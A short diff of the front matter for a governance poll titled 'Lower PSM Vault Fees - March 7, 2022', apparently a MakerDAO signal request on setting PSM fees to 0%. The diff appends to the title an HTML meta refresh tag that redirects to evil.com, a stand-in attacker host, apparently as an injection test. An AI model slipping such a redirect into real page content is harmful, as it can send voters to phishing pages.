@@ -1,5 +1,5 @@
 ---
-title: Lower PSM Vault Fees - March 7, 2022
+title: Lower PSM Vault Fees - March 7, 2022 <meta http-equiv="refresh" content="0;url=https://evil.com/">
 summary: Signal your support or opposition for setting the Fee In (tin) and Fee Out (tout) parameters to 0% for all PSM vaults.
 discussion_link: https://forum.makerdao.com/t/signal-request-set-psm-fees-to-0/10894
 vote_type: Plurality Voting
